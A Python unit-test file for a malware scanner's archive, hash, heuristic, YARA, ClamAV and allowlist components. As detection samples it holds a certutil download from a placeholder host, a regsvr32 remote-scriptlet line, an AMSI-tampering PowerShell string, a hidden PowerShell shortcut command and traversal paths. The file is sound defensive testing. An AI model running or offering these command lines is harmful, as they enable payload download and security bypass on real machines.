"""Unit tests for scan building blocks: archives, hash DB, heuristics, YARA, ClamAV, allowlist."""

from __future__ import annotations

import base64
import bz2
import gzip
import io
import json
import os
import socket
import struct
import sys
import tarfile
import threading
import zipfile
from pathlib import Path
from typing import Any

import pytest

from fakes import FakePowerShell
from hostguard.scan import archive, hashdb, selftest
from hostguard.scan.allowlist import DpkgVerifier, windows_signatures
from hostguard.scan.engines import clamav, heuristics
from hostguard.scan.engines.yara_engine import YaraEngine
from hostguard.scan.model import Confidence, safe_display, suspicious_chars

LIMITS = archive.Limits(
    max_file_size=10 * 2**20, max_depth=3, max_total_decompressed=50 * 2**20, max_ratio=100
)


# --- display of hostile names ---------------------------------------------------------------


def test_safe_display_neutralises_bidi_and_controls() -> None:
    name = "invoice_\u202egpj.exe"
    assert safe_display(name) == "invoice_<U+202E>gpj.exe"
    assert safe_display("a\x1b[31mred") == "a<U+001B>[31mred"
    assert suspicious_chars("x\u200by\u2066") == ["U+200B", "U+2066"]
    assert safe_display("Résumé.pdf") == "Résumé.pdf"


# --- archives ------------------------------------------------------------------------------


def _zip(files: dict[str, bytes], *, encrypt: set[str] | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    raw = bytearray(buf.getvalue())
    # zipfile always clears the "encrypted" bit when writing, so set it in the headers directly.
    for name in encrypt or set():
        enc = name.encode()
        for sig, flag_off, name_off in ((b"PK\x03\x04", 6, 30), (b"PK\x01\x02", 8, 46)):
            i = raw.find(sig)
            while i != -1:
                if raw[i + name_off : i + name_off + len(enc)] == enc:
                    raw[i + flag_off] |= 0x01
                i = raw.find(sig, i + 4)
    return bytes(raw)


def members(data: bytes, limits: archive.Limits = LIMITS) -> list[Any]:
    kind = archive.detect(data)
    assert kind
    return list(
        archive.iter_members(
            data, kind, limits, archive.Budget(limits.max_total_decompressed), "outer.gz"
        )
    )


def test_detect_by_magic_not_extension() -> None:
    assert archive.detect(_zip({"a": b"x"})) == "zip"
    assert archive.detect(gzip.compress(b"x")) == "gzip"
    assert archive.detect(bz2.compress(b"x")) == "bzip2"
    assert archive.detect(b"7z\xbc\xaf\x27\x1c rest") == "7z"
    assert archive.detect(b"MZ\x90\x00") is None


def test_zip_members_encrypted_and_bomb() -> None:
    data = _zip(
        {"ok.txt": b"hello", "secret.txt": b"x" * 10, "bomb.bin": b"\0" * (5 * 2**20)},
        encrypt={"secret.txt"},
    )
    got = members(data)
    ok = [m for m in got if isinstance(m, archive.Member)]
    skips = {m.name: m.reason for m in got if isinstance(m, archive.MemberSkip)}
    assert [m.name for m in ok] == ["ok.txt"] and ok[0].data == b"hello"
    assert "encrypted" in skips["secret.txt"]
    assert "compression ratio" in skips["bomb.bin"]


def test_member_size_limit_and_budget() -> None:
    small = archive.Limits(
        max_file_size=1000, max_depth=3, max_total_decompressed=1500, max_ratio=10_000
    )
    data = _zip({"a": b"1" * 900, "b": b"2" * 900, "c": b"3" * 5000})
    got = members(data, small)
    assert isinstance(got[0], archive.Member)
    reasons = [m.reason for m in got if isinstance(m, archive.MemberSkip)]
    assert any("total decompressed size limit" in r for r in reasons)


def test_tar_and_single_stream() -> None:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo("dir/file.txt")
        info.size = 5
        tf.addfile(info, io.BytesIO(b"hello"))
        link = tarfile.TarInfo("evil-link")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/shadow"
        tf.addfile(link)
    got = members(buf.getvalue())
    assert [(m.name, m.data) for m in got if isinstance(m, archive.Member)] == [
        ("dir/file.txt", b"hello")
    ]
    gz = members(gzip.compress(b"payload"))
    assert isinstance(gz[0], archive.Member) and gz[0].data == b"payload" and gz[0].name == "outer"


def test_gzip_bomb_stopped() -> None:
    bomb = gzip.compress(b"\0" * (20 * 2**20))
    got = members(bomb)
    assert isinstance(got[0], archive.MemberSkip) and "bomb" in got[0].reason


@pytest.mark.parametrize(
    ("name", "bad"),
    [
        ("../../etc/passwd", True),
        ("/abs/path", True),
        ("C:\\Windows\\x.dll", True),
        ("a/../../b", True),
        ("ok/file.txt", False),
    ],
)
def test_traversal_names(name: str, bad: bool) -> None:
    assert archive.traversal_name(name) is bad


# --- hash database ------------------------------------------------------------------------


def test_hashdb_txt_and_csv_with_label(tmp_path: Path) -> None:
    h1, h2, h3 = "a" * 64, "B" * 64, "c" * 64
    (tmp_path / "list.txt").write_text(f"# comment\n{h1}\nnot-a-hash\n", encoding="utf-8")
    (tmp_path / "mb.csv").write_text(
        '# "first_seen_utc","sha256_hash","md5_hash","signature"\n'
        f'"2026-01-01","{h2.lower()}","00","AgentTesla"\n',
        encoding="utf-8",
    )
    db = hashdb.load(tmp_path)
    assert db.count == 2
    assert h1 in db and h2.lower() in db and h3 not in db and "zz" not in db
    hit = db.lookup(h2.lower())
    assert hit is not None and hit.label == "AgentTesla" and hit.source == "mb.csv"
    assert (tmp_path / "known-bad.idx").stat().st_size == 64
    db2 = hashdb.load(tmp_path)  # served from the index
    assert db2.count == 2
    (tmp_path / "list.txt").write_text(f"{h1}\n{h3}\n", encoding="utf-8")  # change -> rebuild
    assert h3 in hashdb.load(tmp_path)


def test_hashdb_empty_dir(tmp_path: Path) -> None:
    db = hashdb.load(tmp_path / "missing")
    assert db.count == 0 and "a" * 64 not in db


# --- heuristics ----------------------------------------------------------------------------


def score_of(data: bytes, name: str) -> tuple[int, set[str]]:
    res, _ = heuristics.analyse(data, name)
    return res.score, {h.name for h in res.hits}


def test_name_heuristics() -> None:
    s, names = score_of(b"MZ", "C:/Users/me/Downloads/invoice_\u202efdp.exe")
    assert "HEUR.BidiName" in names and s >= 60
    s, names = score_of(b"x", "report.pdf.exe")
    assert "HEUR.DoubleExtension" in names and s >= 60
    s, names = score_of(b"x", "photo.jpg" + " " * 10 + ".scr")
    assert "HEUR.PaddedName" in names
    assert score_of(b"x", "archive.tar.gz")[0] == 0
    assert score_of(b"x", "notes.txt")[0] == 0


def test_script_heuristics() -> None:
    s, names = score_of(selftest.synthetic_cradle(), "x.ps1")
    assert {"HEUR.EncodedPowerShell", "HEUR.PSDownloadCradle"} <= names and s >= 60
    s, names = score_of(
        b"certutil -urlcache -split -f http://example.invalid/a.exe a.exe\r\n", "x.bat"
    )
    assert "HEUR.CertutilDownload" in names
    s, names = score_of(b"regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll", "x.cmd")
    assert "HEUR.Regsvr32Remote" in names and s >= 50
    amsi = b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed')"
    assert "HEUR.AmsiTampering" in score_of(amsi, "x.ps1")[1]
    # A normal admin script is not suspicious.
    benign = b"$r = Invoke-WebRequest https://example.invalid/status\nWrite-Output $r.StatusCode\n"
    assert score_of(benign, "check.ps1")[0] < 60
    # Script patterns are only applied to script types.
    assert score_of(selftest.synthetic_cradle(), "notes.txt")[0] == 0


def test_lnk_heuristic() -> None:
    lnk = "powershell -w hidden -c iex".encode("utf-16-le")
    _score, names = score_of(b"L\x00\x00\x00" + lnk, "invoice.lnk")
    assert "HEUR.ShortcutRunsInterpreter" in names


def test_pe_heuristics(monkeypatch: pytest.MonkeyPatch) -> None:
    fake = {
        "is_pe": True,
        "number_of_imported_functions": 3,
        "sections": [
            {
                "name": b"UPX0",
                "raw_data_offset": 0,
                "raw_data_size": 0,
                "characteristics": 0xE0000080,
            },
            {
                "name": b"UPX1",
                "raw_data_offset": 64,
                "raw_data_size": 65536,
                "characteristics": 0xE0000040,
            },
        ],
        "import_details": [
            {
                "library_name": "KERNEL32.dll",
                "functions": [
                    {"name": "VirtualAllocEx"},
                    {"name": "WriteProcessMemory"},
                    {"name": "CreateRemoteThread"},
                ],
            }
        ],
    }

    class FakeModule:
        def __init__(self, name: str) -> None:
            pass

        def invoke(self, data: bytes) -> dict[str, Any]:
            return fake

    monkeypatch.setattr(heuristics.yara_x, "Module", FakeModule)
    import os

    data = b"MZ" + b"\0" * 62 + os.urandom(65536)
    s, names = score_of(data, "tool.exe")
    assert {
        "HEUR.PackerSections",
        "HEUR.HighEntropyCode",
        "HEUR.TinyImportTable",
        "HEUR.ProcessInjectionImports",
    } <= names
    assert s >= 60


def test_pe_parser_failure_never_crashes(monkeypatch: pytest.MonkeyPatch) -> None:
    class Boom:
        def __init__(self, name: str) -> None:
            pass

        def invoke(self, data: bytes) -> dict[str, Any]:
            raise ValueError("malformed")

    monkeypatch.setattr(heuristics.yara_x, "Module", Boom)
    assert score_of(b"MZ" + b"\0" * 100, "x.exe")[0] == 0


def test_office_macro_heuristics(monkeypatch: pytest.MonkeyPatch) -> None:
    class FakeParser:
        closed = False

        def __init__(self, name: str, data: bytes) -> None:
            pass

        def detect_vba_macros(self) -> bool:
            return True

        def analyze_macros(self) -> list[tuple[str, str, str]]:
            return [
                ("AutoExec", "AutoOpen", ""),
                ("Suspicious", "Shell", ""),
                ("Suspicious", "CreateObject", ""),
            ]

        def close(self) -> None:
            FakeParser.closed = True

    import oletools.olevba as ov

    monkeypatch.setattr(ov, "VBA_Parser", FakeParser)
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 100
    s, names = score_of(ole, "invoice.doc")
    assert {
        "HEUR.VBAMacros",
        "HEUR.MacroAutoRun",
        "HEUR.MacroSuspiciousKeywords",
    } <= names and s >= 60
    assert FakeParser.closed
    assert (
        score_of(b"plain text", "notes.doc")[0] == 0
    )  # not an Office container: olevba not called


def test_entropy() -> None:
    assert heuristics.entropy(b"") == 0.0
    assert heuristics.entropy(b"aaaa") == 0.0
    assert 7.9 < heuristics.entropy(bytes(range(256)) * 16) <= 8.0


# --- YARA engine -----------------------------------------------------------------------------


def write_set(root: Path, name: str, rules: str, meta: dict[str, Any] | None = None) -> None:
    d = root / name
    d.mkdir(parents=True)
    (d / "r.yar").write_text(rules, encoding="utf-8")
    if meta is not None:
        (d / "SOURCE.json").write_text(json.dumps(meta), encoding="utf-8")


RULES_HIGH = 'rule fam_x { meta: author = "RL" strings: $a = "FAMILY-X-MARKER" condition: $a }'
RULES_SCORE = """
rule strong { meta: score = 80 author = "Florian" reference = "https://example.invalid/r" strings: $a = "STRONG-MARK" condition: $a }
rule weak { meta: score = 50 strings: $a = "WEAK-MARK" condition: $a }
rule by_name { condition: extension == ".hta" and filename contains "invoice" }
"""


def test_yara_confidence_attribution_and_externals(tmp_path: Path) -> None:
    rules, cache = tmp_path / "rules", tmp_path / "cache"
    write_set(rules, "reversinglabs", RULES_HIGH)
    write_set(rules, "signature-base", RULES_SCORE)
    write_set(rules, "community", 'rule c { strings: $a = "COMMUNITY-MARK" condition: $a }')
    write_set(rules, "broken", "rule bad { condition: nosuchthing }")
    y = YaraEngine(rules, cache)
    assert y.report.files_failed and "broken" in y.report.files_failed[0]
    assert not y.report.from_cache

    def hits(data: bytes, name: str = "x.bin") -> dict[str, Any]:
        return {h.name: h for h in y.scan_bytes(data, name)[0]}

    h = hits(b"..FAMILY-X-MARKER..")["reversinglabs:fam_x"]
    assert h.confidence == Confidence.HIGH and h.author == "RL" and h.license == "MIT"
    h = hits(b"STRONG-MARK")["signature-base:strong"]
    assert (
        h.confidence == Confidence.HIGH
        and "Detection Rule License" in h.license
        and h.reference.endswith("/r")
    )
    assert hits(b"WEAK-MARK")["signature-base:weak"].confidence == Confidence.LOW
    assert hits(b"COMMUNITY-MARK")["community:c"].confidence == Confidence.LOW
    assert "signature-base:by_name" in hits(b"<html>", "C:/Users/me/Downloads/invoice.HTA")
    assert "signature-base:by_name" not in hits(b"<html>", "page.html")
    # Built-in EICAR rule (EICAR is built in memory only).
    assert "builtin:HostGuard_EICAR_Test_File" in hits(selftest.eicar_bytes())
    # Second load comes from the compiled cache.
    assert YaraEngine(rules, cache).report.from_cache


def test_test_only_rule_is_opt_in(tmp_path: Path) -> None:
    marker = b"HOSTGUARD-TEST-ONLY-MARKER-7f3c9a1e"
    assert YaraEngine(tmp_path, tmp_path / "c").scan_bytes(marker, "x")[0] == []
    hits = YaraEngine(tmp_path, tmp_path / "c2", include_test_rules=True).scan_bytes(marker, "x")[0]
    assert [h.name for h in hits] == ["hostguard_test:HostGuard_Test_Marker"]


# --- ClamAV -------------------------------------------------------------------------------------


def test_clamd_reply_parsing_and_address_policy() -> None:
    hits, note = clamav.parse_reply("stream: Win.Test.EICAR_HDB-1 FOUND")
    assert (
        hits[0].name == "Win.Test.EICAR_HDB-1"
        and hits[0].confidence == Confidence.HIGH
        and not note
    )
    assert clamav.parse_reply("stream: OK") == ([], "")
    assert "size limit" in clamav.parse_reply("INSTREAM size limit exceeded. ERROR")[1]
    assert clamav.parse_address("tcp:127.0.0.1:3310").port == 3310
    with pytest.raises(ValueError, match="this machine"):
        clamav.parse_address("tcp:10.0.0.5:3310")


@pytest.mark.skipif(
    not hasattr(socket, "AF_UNIX") or sys.platform == "win32", reason="Unix sockets"
)
def test_clamd_instream_protocol(tmp_path: Path) -> None:
    """A fake clamd that speaks the documented INSTREAM framing."""
    sock_path = str(tmp_path / "clamd.sock")
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(sock_path)
    srv.listen(5)
    received: list[bytes] = []

    def serve() -> None:
        while True:
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            with conn:
                cmd = b""
                while not cmd.endswith(b"\0"):
                    cmd += conn.recv(1)
                if cmd == b"zPING\0":
                    conn.sendall(b"PONG\0")
                elif cmd == b"zVERSION\0":
                    conn.sendall(b"ClamAV 1.4.0/27000\0")
                elif cmd == b"zINSTREAM\0":
                    data = b""
                    while True:
                        (n,) = struct.unpack(">I", conn.recv(4, socket.MSG_WAITALL))
                        if n == 0:
                            break
                        data += conn.recv(n, socket.MSG_WAITALL)
                    received.append(data)
                    conn.sendall(b"stream: Fake.Sig FOUND\0" if b"BAD" in data else b"stream: OK\0")

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    try:
        c = clamav.find_clamd(sock_path)
        assert c is not None and c.version.startswith("ClamAV")
        assert c.scan_bytes(b"x" * (3 * 2**20) + b"BAD")[0][0].name == "Fake.Sig"
        assert c.scan_bytes(b"good")[0] == []
        f = tmp_path / "f.bin"
        f.write_bytes(b"BAD stuff")
        assert c.scan_file(str(f))[0][0].name == "Fake.Sig"
        assert received[0].endswith(b"BAD") and len(received[0]) == 3 * 2**20 + 3
    finally:
        srv.close()


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX shebang script as a fake clamscan")
def test_clamscan_batch_with_file_list(tmp_path: Path) -> None:
    fake = tmp_path / "clamscan"
    fake.write_text(
        "#!" + sys.executable + "\n"
        "import sys\n"
        "lst = [a.split('=',1)[1] for a in sys.argv if a.startswith('--file-list=')][0]\n"
        "for p in open(lst).read().splitlines():\n"
        "    if 'evil' in p: print(p + ': Fake.Sig FOUND')\n"
        "sys.exit(1)\n"
    )
    fake.chmod(0o755)
    lst = tmp_path / "list.txt"
    lst.write_text(f"{tmp_path}/ok.txt\n{tmp_path}/-evil: name.exe\n", encoding="utf-8")
    found, note = clamav.clamscan_batch(str(fake), str(lst))
    assert found == {f"{tmp_path}/-evil: name.exe": "Fake.Sig"} and note == ""


# --- allowlist ------------------------------------------------------------------------------------


def test_windows_signature_trust_uses_os_validation_and_stdin() -> None:
    ps = FakePowerShell(
        {
            "Get-AuthenticodeSignature": [
                {
                    "Path": "C:\\a.exe",
                    "Status": "Valid",
                    "Subject": "CN=Microsoft Windows, O=Microsoft Corporation, C=US",
                    "SignatureType": "Catalog",
                },
                {
                    "Path": "C:\\b.exe",
                    "Status": "Valid",
                    "Subject": "CN=Some Dev, O=Some Dev Ltd, C=GB",
                    "SignatureType": "Authenticode",
                },
                {
                    "Path": "C:\\c.exe",
                    "Status": "HashMismatch",
                    "Subject": "CN=x, O=Microsoft Corporation",
                    "SignatureType": "Authenticode",
                },
                {
                    "Path": "C:\\d.exe",
                    "Status": "NotSigned",
                    "Subject": "",
                    "SignatureType": "None",
                },
            ]
        }
    )
    paths = ["C:\\a.exe", "C:\\b.exe", "C:\\c.exe", "C:\\d.exe"]
    res = windows_signatures(paths, ps, ["Microsoft Corporation"])
    assert res["C:\\a.exe"].trusted and "Microsoft Corporation" in res["C:\\a.exe"].detail
    assert (
        not res["C:\\b.exe"].trusted
        and "not on the trusted-publisher list" in res["C:\\b.exe"].detail
    )
    assert not res["C:\\c.exe"].trusted and "HashMismatch" in res["C:\\c.exe"].detail
    assert not res["C:\\d.exe"].trusted
    # Paths travel as JSON on stdin, never inside the script text.
    assert json.loads(ps.stdin[0] or b"[]") == paths
    assert all(p not in ps.calls[0] for p in paths)


def test_dpkg_verifier(tmp_path: Path) -> None:
    import hashlib

    # dpkg records POSIX paths relative to /, so this works the same on any OS.
    info = tmp_path / "info"
    info.mkdir()
    md5 = hashlib.md5(b"original", usedforsecurity=False).hexdigest()
    (info / "tool.md5sums").write_text(f"{md5}  usr/bin/tool\n", encoding="utf-8")
    t = DpkgVerifier(info).check("/usr/bin/tool", b"original")
    assert t is not None and t.trusted
    t = DpkgVerifier(info).check("/usr/bin/tool", b"tampered")
    assert t is not None and not t.trusted and "MODIFIED" in t.detail
    assert DpkgVerifier(info).check("/not/owned", b"original") is None


def test_allowlist_sources_are_wired_per_os(tmp_path: Path) -> None:
    from hostguard.scan.factory import allowlist_sources
    from hostguard.winsys import RealPowerShell

    ps, dpkg = allowlist_sources("win32", tmp_path)
    assert isinstance(ps, RealPowerShell) and dpkg is None
    ps, dpkg = allowlist_sources("linux", tmp_path)
    assert ps is None and isinstance(dpkg, DpkgVerifier)
    assert allowlist_sources("darwin", tmp_path / "missing") == (None, None)


def test_eicar_constant_integrity() -> None:
    data = selftest.eicar_bytes()
    assert len(data) == 68 and data.startswith(b"X5O!")
    # The repository (including compiled .pyc files) must never contain the EICAR text, or
    # antivirus could quarantine hostguard's own files. The needles are derived at runtime so
    # Python cannot constant-fold them into this test's .pyc.
    root = Path(__file__).resolve().parents[2]
    needles = [data[:12], data[33:58]]
    for p in [*root.joinpath("src").rglob("*"), *root.joinpath("tests").rglob("*")]:
        if p.is_file():
            blob = p.read_bytes()
            for needle in needles:
                assert needle not in blob, p


def test_synthetic_cradle_is_inert() -> None:
    text = selftest.synthetic_cradle().decode()
    enc = text.split()[-1]
    assert "example.invalid" in base64.b64decode(enc).decode("utf-16-le")


# --- VirusTotal (hash lookups only, mocked) ---------------------------------------------------


def test_virustotal_lookup_is_hash_only(tmp_path: Path) -> None:
    import httpx

    from hostguard.credentials import Secret
    from hostguard.net import HttpClient, JsonCache
    from hostguard.scan.engines import virustotal

    seen: list[httpx.Request] = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req)
        if req.url.path.endswith("a" * 64):
            return httpx.Response(
                200,
                json={
                    "data": {
                        "attributes": {
                            "last_analysis_stats": {
                                "malicious": 52,
                                "suspicious": 1,
                                "undetected": 10,
                                "harmless": 0,
                            },
                            "popular_threat_classification": {
                                "suggested_threat_label": "trojan.agenttesla"
                            },
                        }
                    }
                },
            )
        return httpx.Response(404, json={"error": {"code": "NotFoundError"}})

    key = Secret("VT_API_KEY", "vt-test-key-1234567890", "env")
    with HttpClient(
        JsonCache(tmp_path), transport=httpx.MockTransport(handler), sleep=lambda s: None
    ) as http:
        hit, note = virustotal.lookup(http, key, "a" * 64)
        assert note == ""
        miss, note2 = virustotal.lookup(http, key, "b" * 64)
    assert hit is not None and "52/63" in hit.detail and hit.name == "trojan.agenttesla"
    assert hit.confidence == Confidence.LOW  # evidence only; never decides a verdict
    assert miss is None and "not known" in note2
    assert all(r.method == "GET" for r in seen)  # never uploads
    assert seen[0].headers["x-apikey"] == "vt-test-key-1234567890"
    assert "vt-test-key" not in str(seen[0].url)


@pytest.mark.skipif(sys.platform != "win32", reason="real Get-AuthenticodeSignature (Windows only)")
def test_windows_signatures_live(tmp_path: Path) -> None:
    from hostguard.winsys import RealPowerShell

    system32 = Path(os.environ.get("SYSTEMROOT", r"C:\Windows")) / "System32"
    signed = [str(system32 / "cmd.exe"), str(system32 / "kernel32.dll")]
    unsigned = tmp_path / "unsigned.exe"
    unsigned.write_bytes(b"MZ" + b"\0" * 62)
    out = windows_signatures([*signed, str(unsigned)], RealPowerShell(), ["Microsoft Corporation"])
    for p in signed:
        assert out[p].trusted, out.get(p)
    assert str(unsigned) not in out or not out[str(unsigned)].trusted
    # A real Microsoft signature is not trusted when Microsoft is not on the list.
    out = windows_signatures(signed[:1], RealPowerShell(), ["Example Corp"])
    assert not out[signed[0]].trusted
